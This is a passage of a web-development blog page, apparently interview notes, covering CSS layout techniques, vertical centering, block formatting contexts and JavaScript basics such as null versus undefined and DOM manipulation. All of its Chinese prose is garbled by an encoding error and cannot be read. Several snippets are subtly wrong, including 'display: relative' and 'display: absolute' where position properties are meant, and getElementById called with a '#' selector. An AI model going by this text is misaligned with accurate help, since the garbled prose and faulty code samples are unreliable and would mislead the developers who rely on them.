class="attribute">display</span>: table-cell;</span><br><span class="line">        <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><ul><li><a href="http://stackoverflow.com/questions/12557897/how-to-vertically-middle-align-floating-elements-of-unknown-heights" target="_blank" rel="noopener">http://stackoverflow.com/questions/12557897/how-to-vertically-middle-align-floating-elements-of-unknown-heights</a></li><li><a href="http://stackoverflow.com/questions/16958049/how-to-center-vertically-a-floating-div-inside-an-inline-block" target="_blank" rel="noopener">http://stackoverflow.com/questions/16958049/how-to-center-vertically-a-floating-div-inside-an-inline-block</a></li></ul><h4 id="å…ƒç´ åŒè¡Œæ’åˆ—"><a href="#å…ƒç´ åŒè¡Œæ’åˆ—" class="headerlink" title="å…ƒç´ åŒè¡Œæ’åˆ—"></a>å…ƒç´ åŒè¡Œæ’åˆ—</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>display: inline-block;</code>ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å»æ‰ <code>inline-block</code> é—´çš„ç©ºæ ¼æ–¹æ³•1ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å»æ‰ <code>inline-block</code> é—´çš„ç©ºæ ¼æ–¹æ³•2ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="selector-class">.box</span> &#123;</span><br><span class="line">        <span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>float</code>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">    &amp;:before,</span><br><span class="line">    &amp;:after &#123;</span><br><span class="line">        <span class="attribute">display</span>: table;</span><br><span class="line">        <span class="attribute">content</span>: <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;:after &#123;</span><br><span class="line">        <span class="attribute">clear</span>: both;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="selector-class">.box</span> &#123;</span><br><span class="line">        <span class="attribute">float</span>: left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>flexbox</code>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¸ºä»€ä¹ˆä¸æå€¡ä½¿ç”¨-table-å¸ƒå±€ï¼š"><a href="#ä¸ºä»€ä¹ˆä¸æå€¡ä½¿ç”¨-table-å¸ƒå±€ï¼š" class="headerlink" title="ä¸ºä»€ä¹ˆä¸æå€¡ä½¿ç”¨ table å¸ƒå±€ï¼š"></a>ä¸ºä»€ä¹ˆä¸æå€¡ä½¿ç”¨ <code>table</code> å¸ƒå±€ï¼š</h4><ol><li>å ç”¨å­—èŠ‚å¤ªå¤šï¼Œä¸‹è½½æ…¢</li><li>ä¼šå µå¡é¡µé¢æ¸²æŸ“</li><li>å¯èƒ½å¾—æŠŠå•ä¸ªã€æœ‰é€»è¾‘çš„å›¾ç‰‡åˆ‡æˆåˆ†æ•£çš„å°ä¸ª</li><li>åœ¨æŸäº›æµè§ˆå™¨ä¸Šå¯¼è‡´å¤åˆ¶æ–‡å­—å¾ˆè¯¡å¼‚ï¼Œç”¨æˆ·ä½“éªŒå·®</li><li>ä¸€äº›æ ·å¼ä¼šä¸èµ·ä½œç”¨ (<code>td { height: 100%; }</code>)</li><li>ä½¿ç”¨æ ·å¼æ—¶éå¸¸éš¾ä»¥ä¼˜åŒ–</li><li>ä½œç”¨æ˜¯å±•ç¤ºï¼Œä¸æ˜¯å†…å®¹ï¼Œä»è¯­ä¹‰ä¸Šçœ‹æ˜¯ä¸æ­£ç¡®çš„</li><li>ä¸€æ—¦å†™å¥½ï¼Œå¾ˆéš¾ç”¨ <code>CSS</code> æ”¹å˜å®ƒã€‚</li></ol><h4 id="CSS-å‚ç›´å±…ä¸­"><a href="#CSS-å‚ç›´å±…ä¸­" class="headerlink" title="CSS å‚ç›´å±…ä¸­"></a>CSS å‚ç›´å±…ä¸­</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>table</code> å¸ƒå±€ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: table-cell;</span><br><span class="line">    <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">    <span class="selector-class">.inner</span> &#123;</span><br><span class="line">        <span class="attribute">display</span>: inline-block;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>transform</code>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: relative;</span><br><span class="line">    <span class="selector-class">.inner</span> &#123;</span><br><span class="line">        <span class="attribute">display</span>: absolute;</span><br><span class="line">        <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">        <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">        <span class="attribute">transform</span>: translate(-<span class="number">50%</span>, -<span class="number">50%</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>flexbox</code>ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.wrapper</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>: center;</span><br><span class="line">    <span class="selector-class">.inner</span> &#123;</span><br><span class="line">        <span class="attribute">align-self</span>: center;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€‚ç”¨ <code>absolute</code> å¸ƒå±€ï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.Absolute-Center</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: auto;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>; <span class="attribute">left</span>: <span class="number">0</span>; <span class="attribute">bottom</span>: <span class="number">0</span>; <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="æµè§ˆå™¨å†…æ ¸"><a href="#æµè§ˆå™¨å†…æ ¸" class="headerlink" title="æµè§ˆå™¨å†…æ ¸"></a>æµè§ˆå™¨å†…æ ¸</h4><ul><li>Blink â€“ Chrome</li><li>Trident â€“ Internet Explorer</li><li>Gecko â€“ Firfox</li><li>Webkit â€“ Safari</li><li>Presto â€“ Opera</li><li>Others</li></ul><h4 id="CSS-ç›’å­æ¨¡å‹"><a href="#CSS-ç›’å­æ¨¡å‹" class="headerlink" title="CSS ç›’å­æ¨¡å‹"></a>CSS ç›’å­æ¨¡å‹</h4><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/64/W3C_and_Internet_Explorer_box_models.svg/320px-W3C_and_Internet_Explorer_box_models.svg.png?1445751206628" alt="CSS Box"></p><h4 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h4><p><strong>BFC</strong> å…¨ç§° Block Formatting Contextï¼Œå—çº§æ ¼å¼åŒ–ä¸Šä¸‹æ–‡ï¼Œæ˜¯ç½‘é¡µä¸­ <strong>CSS</strong> æ¸²æŸ“çš„ä¸€éƒ¨åˆ†ï¼Œæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ¸²æŸ“å®¹å™¨ï¼Œå…¶å†…éƒ¨å­å…ƒç´ ä¸ä¼šå½±å“åˆ°å¤–éƒ¨å…ƒç´ ã€‚</p><h5 id="å½¢æˆæ¡ä»¶"><a href="#å½¢æˆæ¡ä»¶" class="headerlink" title="å½¢æˆæ¡ä»¶"></a>å½¢æˆæ¡ä»¶</h5><ul><li>è¢«æ ¹å…ƒç´ æ‰€åŒ…å«</li><li><code>float</code> ä¸ä¸º <code>none</code></li><li>ç»å¯¹å®šä½å…ƒç´ ï¼ŒåŒ…æ‹¬ <code>absolute</code> å’Œ <code>fixed</code></li><li>å—çŠ¶åŒ…è£¹ï¼Œæ¯”å¦‚ <code>display</code> ä¸º <code>inline-block</code>, <code>table-cell</code>, <code>table-caption</code>, <code>flex</code>, <code>inline-flex</code></li><li><code>overflow</code> ä¸ä¸º <code>visible</code></li></ul><h5 id="å¸ƒå±€"><a href="#å¸ƒå±€" class="headerlink" title="å¸ƒå±€"></a>å¸ƒå±€</h5><ul><li>åœ¨ <strong>BFC</strong> å†…éƒ¨ï¼Œå„ä¸ª Box ä¸€ä¸ªä¸ªå‚ç›´æ”¾ç½®ï¼Œç”± <strong>BFC</strong> çš„å¤´éƒ¨å¼€å§‹</li><li>ç›¸é‚»ä¹‹é—´ Box çš„è·ç¦»ç”± `margin å†³å®šï¼ŒåŒä¸€ä¸ª <strong>BFC</strong> å†…çš„ç›¸é‚» Box ä¹‹é—´ä¼šå‘ç”Ÿ <a href="http://www.w3.org/TR/CSS21/box.html#collapsing-margins" target="_blank" rel="noopener">margin collapsing</a></li><li>æ¯ä¸ª Box å¤–è¾¹ç•Œ(margin) éƒ½å’Œ <strong>BFC</strong> å·¦è¾¹ç•Œç›¸æ¥è§¦(å¯¹äºä»å³åˆ°å·¦æ ¼å¼åŒ–ï¼Œåˆ™æ¥è§¦å³è¾¹ç•Œ)ï¼Œæµ®åŠ¨å…ƒç´ åŒæ ·ï¼Œé™¤éå†…éƒ¨ float Box åˆåˆ›å»ºä¸€ä¸ªæ–°çš„ <strong>BFC</strong></li><li><strong>BFC</strong> æ˜¯ä¸€ä¸ªéš”ç¦»çš„ç‹¬ç«‹å®¹å™¨ï¼Œå…¶å†…éƒ¨å­å…ƒç´ ä¸ä¼šå½±å“åˆ°å¤–éƒ¨å…ƒç´ </li><li>è®¡ç®— <strong>BFC</strong> çš„é«˜åº¦æ—¶ï¼Œæµ®åŠ¨å…ƒç´ ä¹Ÿå‚ä¸è®¡ç®—</li></ul><h5 id="å‚è€ƒ-1"><a href="#å‚è€ƒ-1" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><ul><li><a href="http://www.w3.org/TR/CSS21/visuren.html#block-formatting" target="_blank" rel="noopener">http://www.w3.org/TR/CSS21/visuren.html#block-formatting</a></li><li><a href="http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html" target="_blank" rel="noopener">http://www.cnblogs.com/lhb25/p/inside-block-formatting-ontext.html</a></li><li><a href="http://www.cnblogs.com/winter-cn/archive/2012/11/16/2772562.html" target="_blank" rel="noopener">http://www.cnblogs.com/winter-cn/archive/2012/11/16/2772562.html</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Block_formatting_context" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/Guide/CSS/Block_formatting_context</a></li></ul><h4 id="Number-1-å’Œ-new-Number-1-çš„åŒºåˆ«"><a href="#Number-1-å’Œ-new-Number-1-çš„åŒºåˆ«" class="headerlink" title="Number(1) å’Œ new Number(1) çš„åŒºåˆ«"></a>Number(1) å’Œ new Number(1) çš„åŒºåˆ«</h4><p><code>1</code> å’Œ <code>Number(1)</code> è¿”å›çš„æ˜¯ number åŸå§‹å€¼ï¼Œ<code>new Number(1)</code> è¿”å›ä¸€ä¸ª Number å¯¹è±¡ï¼Œ<code>Number()</code> è¢«ç”¨äºå°†éœ€è¦çš„å˜é‡è½¬æ¢ä¸º number å˜é‡ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="number">1</span>;    <span class="comment">// "number"</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="built_in">Number</span>(<span class="number">1</span>);    <span class="comment">// "number"</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>);    <span class="comment">// "object"</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">instanceof</span> <span class="built_in">Number</span>;    <span class="comment">// false</span></span><br><span class="line"><span class="built_in">Number</span>(<span class="number">1</span>) <span class="keyword">instanceof</span> <span class="built_in">Number</span>;    <span class="comment">// false</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>) <span class="keyword">instanceof</span> <span class="built_in">Number</span>;    <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span> === <span class="built_in">Number</span>(<span class="number">1</span>);    <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> === (<span class="keyword">new</span> <span class="built_in">Number</span>(<span class="number">1</span>)).valueOf();    <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="null-å’Œ-undefined-çš„åŒºåˆ«"><a href="#null-å’Œ-undefined-çš„åŒºåˆ«" class="headerlink" title="null å’Œ undefined çš„åŒºåˆ«"></a>null å’Œ undefined çš„åŒºåˆ«</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>    <span class="comment">// "object"</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>    <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><p><code>undefined</code> æŒ‡å®šä¹‰äº†ä½†å°šæœªè¢«èµ‹å€¼ï¼Œ<code>null</code> åˆ™æ˜¯ä¸€ä¸ªå¯åˆ†é…çš„å€¼ï¼Œæ¯”å¦‚ä¼ ç»™å‡½æ•°çš„å‚æ•°ä¸ºç©ºå¯ä»¥ç”¨åˆ° <code>null</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">foo(bar, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="literal">null</span> === <span class="literal">undefined</span>;    <span class="comment">// false</span></span><br><span class="line"><span class="literal">null</span> == <span class="literal">undefined</span>;    <span class="comment">// true</span></span><br><span class="line"><span class="literal">undefined</span> === <span class="literal">undefined</span>;    <span class="comment">// true</span></span><br><span class="line"><span class="literal">null</span> === <span class="literal">null</span>;    <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="å…‹éš†-DOM-èŠ‚ç‚¹"><a href="#å…‹éš†-DOM-èŠ‚ç‚¹" class="headerlink" title="å…‹éš† DOM èŠ‚ç‚¹"></a>å…‹éš† DOM èŠ‚ç‚¹</h4><p>ä»…ä»…å…‹éš†èŠ‚ç‚¹ä¸å…‹éš†å…¶å­å…ƒç´ ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'#foo'</span>).cloneNode();</span><br></pre></td></tr></table></figure><p>åŒæ—¶å…‹éš†å…¶å­å…ƒç´ ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'#foo'</span>).cloneNode(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><h4 id="DOM-çš„å¢åˆ "><a href="#DOM-çš„å¢åˆ " class="headerlink" title="DOM çš„å¢åˆ "></a>DOM çš„å¢åˆ </h4><p>å¢åŠ èŠ‚ç‚¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> childNode = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">childNode.id = <span class="string">'bar'</span>;</span><br><span class="line">childNode.className = <span class="string">'foo'</span>;</span><br><span class="line">childNode.href = <span class="string">'http://foo.bar'</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'parentNode'</span>).appendChild(childNode);</span><br></pre></td></tr></table></figure><p>åˆ é™¤èŠ‚ç‚¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Element.prototype.remove = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.parentElement.removeChild(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å‡½æ•°éœ€è¦çš„å‚æ•°é•¿åº¦"><a href="#å‡½æ•°éœ€è¦çš„å‚æ•°é•¿åº¦" class="headerlink" title="å‡½æ•°éœ€è¦çš„å‚æ•°é•¿åº¦"></a>å‡½æ•°éœ€è¦çš„å‚æ•°é•¿åº¦</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>)</span>&#123;&#125;).length === <span class="number">2</span>;    <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h4 id="æ€ä¹ˆåˆ¤æ–­æ•°ç»„"><a href="#æ€ä¹ˆåˆ¤æ–­æ•°ç»„" class="headerlink" title="æ€ä¹ˆåˆ¤æ–­æ•°ç»„"></a>æ€ä¹ˆåˆ¤æ–­æ•°ç»„</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.toString.call(givenArrVar) === <span class="string">'[object Array]'</span></span><br></pre></td></tr></table></figure><h4 id="æ•°ç»„-unique"><a href="#æ•°ç»„-unique" class="headerlink" title="æ•°ç»„ unique"></a>æ•°ç»„ unique</h4><p>ä»£ç ç‰‡æ®µæ¥è‡ªï¼š<a href="http://stackoverflow.com/a/1961068/3021990" target="_blank" rel="noopener">Unique values in an array</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.getUnique = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> u = &#123;&#125;, a = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, l = <span class="keyword">this</span>.length; i &lt; l; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(u.hasOwnProperty(<span class="keyword">this</span>[i])) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a.push(<span class="keyword">this</span>[i]);</span><br><span class="line">        u[<span class="keyword">this</span>[i]] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è·å–-select-çš„å€¼"><a href="#è·å–-select-çš„å€¼" class="headerlink" title="è·å– select çš„å€¼"></a>è·å– select çš„å€¼</h4><p>æœ¬é¢˜æ¥è‡ªé˜¿é‡Œå‰ç«¯ç¬”è¯•ï¼Œæ”¹å˜ä¸‹æ‹‰åˆ—è¡¨æ¡†èƒ½æ˜¾ç¤ºå½“å‰é€‰ä¸­çš„å€¼åœ¨è¾“å…¥æ¡†</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"appform"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">size</span>=<span class="string">"1"</span> <span class="attr">name</span>=<span class="string">"selectedApp"</span> <span class="attr">onchange</span>=<span class="string">"changeApp()"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"td"</span> <span class="attr">selected</span>&gt;</span>Taobao<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"tm"</span>&gt;</span>Tmall<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"mj"</span>&gt;</span>Miao<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> changeApp = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> form = <span class="built_in">document</span>.forms.appform;</span><br><span class="line">    <span class="keyword">var</span> select = form.selectedApp;</span><br><span class="line">    form.app.value = select[select.selectedIndex].text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æœ‰ä¸ª <code>selectedOptions</code> è¿”å›ä¸€ä¸ª element listï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.forms.appform.selectedApp.selectedOptions;</span><br><span class="line"><span class="comment">// [&lt;option value="td" selected&gt;Taobao&lt;/option&gt;]</span></span><br></pre></td></tr></table></figure><h4 id="let-å’Œ-var-åŒºåˆ«"><a href="#let-å’Œ-var-åŒºåˆ«" class="headerlink" title="let å’Œ var åŒºåˆ«"></a>let å’Œ var åŒºåˆ«</h4><p>ä¸€ä¸ªä»£ç å—å†…åŒåå˜é‡ç”¨ <code>let</code> åªèƒ½å£°æ˜ä¸€æ¬¡ï¼Œè€Œ <code>var</code> å¯å£°æ˜å¤šæ¬¡ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line"><span class="keyword">var</span> a;    <span class="comment">// no error</span></span><br><span class="line"><span class="keyword">let</span> b;</span><br><span class="line"><span class="keyword">let</span> b;    <span class="comment">// error</span></span><br></pre></td></tr></table></figure><p><code>let</code> åœ¨ <code>if</code>, <code>for</code> å’Œ <strong>ECMAScript6</strong> ä¸­çš„<code>{}</code>å†…è‡ªæœ‰ä½œç”¨åŸŸï¼Œå¯¹å¤–éƒ¨æ— å½±å“ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) 